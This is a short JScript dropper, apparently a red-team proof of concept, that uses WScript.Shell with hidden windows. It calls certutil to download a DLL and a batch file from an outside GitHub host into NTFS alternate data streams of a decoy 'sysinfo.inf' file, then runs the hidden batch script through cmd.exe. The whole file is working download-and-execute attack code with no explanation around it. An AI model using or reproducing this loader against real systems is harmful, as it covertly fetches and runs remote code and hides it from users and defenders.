
var oShell = new ActiveXObject("WScript.Shell");
oShell.Run("certutil -urlcache -split -f https://github.com/RT-KT/PoC/raw/master/hw64.dll C:\\Users\\Public\\sysinfo.inf:dwn.dll", 0);
oShell.Run("certutil -urlcache -split -f https://raw.githubusercontent.com/RT-KT/PoC/master/inject-from-ads.bat C:\\Users\\Public\\sysinfo.inf:injexp.bat", 0);
oShell.Run("cmd.exe /c \"cmd.exe /v /q < C:\\Users\\Public\\sysinfo.inf:injexp.bat\"\"", 0);
